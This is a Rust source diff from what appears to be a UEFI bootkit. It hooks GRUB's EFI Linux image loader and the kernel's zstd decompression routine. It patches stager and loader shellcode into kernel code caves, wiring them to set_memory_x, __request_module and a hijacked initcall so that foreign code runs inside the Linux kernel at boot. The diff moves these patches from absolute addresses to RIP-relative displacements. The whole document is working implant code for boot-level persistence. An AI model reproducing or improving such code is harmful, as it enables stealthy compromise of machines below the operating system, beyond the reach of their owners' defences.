@@ -25,11 +25,11 @@ const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
 const REQUEST_MODULE_DISTANCE: u8 = 0x45;
 const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
 const SET_MEMORY_X_DISTANCE: u8 = 6;
-const REQUEST_MODULE_SENTINEL: u64 = 0xDEADBEEFDEADBEEF;
-const ORIGINAL_FN_SENTINEL: u64 = 0xCAFEBABECAFEBABE;
-const CAVE_PAGE_SENTINEL: u64 = 0xBADC0FFEE0DDF00D;
-const SET_MEMORY_X_SENTINEL: u64 = 0xFACEFEEDFACEFEED;
-const LOADER_VIRT_SENTINEL: u64 = 0xDEADFACEDEADFACE;
+const CAVE_PAGE_DISP_SENTINEL: u32 = 0x11223344;
+const SET_MEMORY_X_REL_SENTINEL: u32 = 0x55667788;
+const LOADER_JMP_REL_SENTINEL: u32 = 0x99AABBCC;
+const REQUEST_MODULE_REL_SENTINEL: u32 = 0xDDEEFF00;
+const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -301,38 +301,47 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         loader_cave, loader_cave_virt
     );
 
-    // Page-aligned virt addr passed as arg1 to set_memory_x(addr, nrpages=1).
-    let loader_cave_page_virt: u64 = (loader_cave_virt & !0xFFF) as u64;
-    debug!(
-        "Loader cave page (for set_memory_x): {:#x}",
-        loader_cave_page_virt
-    );
-
     // ── Patch stager blob ──────────────────────────────────────────────────────
     let mut stager = [0u8; STAGER_LEN];
     stager.copy_from_slice(STAGER_TEMPLATE);
 
-    let sentinel = CAVE_PAGE_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel(&stager, &sentinel) {
-        stager[off..off + 8].copy_from_slice(&loader_cave_page_virt.to_le_bytes());
+    // disp32 in `lea rdi, [rip + disp32]`: rip-after = stager_cave_virt + off + 4
+    let sentinel = CAVE_PAGE_DISP_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
+        let disp32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
+        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
+            error!("Loader cave too far from stager for disp32: delta={:#x}", disp32);
+            return ret_val;
+        }
+        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find CAVE_PAGE_SENTINEL in stager");
+        error!("Failed to find CAVE_PAGE_DISP_SENTINEL in stager");
         return ret_val;
     }
 
-    let sentinel = SET_MEMORY_X_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel(&stager, &sentinel) {
-        stager[off..off + 8].copy_from_slice(&(set_memory_x_virt as u64).to_le_bytes());
+    let sentinel = SET_MEMORY_X_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
+        let rel32 = (set_memory_x_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!("set_memory_x too far from stager for rel32: delta={:#x}", rel32);
+            return ret_val;
+        }
+        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find SET_MEMORY_X_SENTINEL in stager");
+        error!("Failed to find SET_MEMORY_X_REL_SENTINEL in stager");
         return ret_val;
     }
 
-    let sentinel = LOADER_VIRT_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel(&stager, &sentinel) {
-        stager[off..off + 8].copy_from_slice(&(loader_cave_virt as u64).to_le_bytes());
+    let sentinel = LOADER_JMP_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
+        let rel32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!("Loader cave too far from stager for rel32: delta={:#x}", rel32);
+            return ret_val;
+        }
+        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find LOADER_VIRT_SENTINEL in stager");
+        error!("Failed to find LOADER_JMP_REL_SENTINEL in stager");
         return ret_val;
     }
 
@@ -340,20 +349,30 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     let mut loader = [0u8; LOADER_LEN];
     loader.copy_from_slice(LOADER_TEMPLATE);
 
-    let sentinel = REQUEST_MODULE_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel(&loader, &sentinel) {
-        loader[off..off + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
+    let sentinel = REQUEST_MODULE_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let rel32 = (request_module_virt as i64) - (loader_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!("__request_module too far from loader cave for rel32: delta={:#x}", rel32);
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find REQUEST_MODULE_SENTINEL in loader");
+        error!("Failed to find REQUEST_MODULE_REL_SENTINEL in loader");
         return ret_val;
     }
 
-    let sentinel = ORIGINAL_FN_SENTINEL.to_le_bytes();
-    if let Some(off) = find_sentinel(&loader, &sentinel) {
-        loader[off..off + 8]
-            .copy_from_slice(&(initcall_info.original_target_virtual_address as u64).to_le_bytes());
+    let sentinel = ORIGINAL_FN_REL_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel_4(&loader, &sentinel) {
+        let rel32 = (initcall_info.original_target_virtual_address as i64)
+            - (loader_cave_virt as i64 + off as i64 + 4);
+        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
+            error!("Original initcall too far from loader cave for rel32: delta={:#x}", rel32);
+            return ret_val;
+        }
+        loader[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
     } else {
-        error!("Failed to find ORIGINAL_FN_SENTINEL in loader");
+        error!("Failed to find ORIGINAL_FN_REL_SENTINEL in loader");
         return ret_val;
     }
 
@@ -393,7 +412,7 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
     ret_val
 }
 
-/// Finds the byte offset of an 8-byte sentinel value within a buffer.
-fn find_sentinel(buf: &[u8], sentinel: &[u8; 8]) -> Option<usize> {
-    buf.windows(8).position(|w| w == sentinel)
+/// Finds the byte offset of a 4-byte sentinel value within a buffer.
+fn find_sentinel_4(buf: &[u8], sentinel: &[u8; 4]) -> Option<usize> {
+    buf.windows(4).position(|w| w == sentinel)
 }
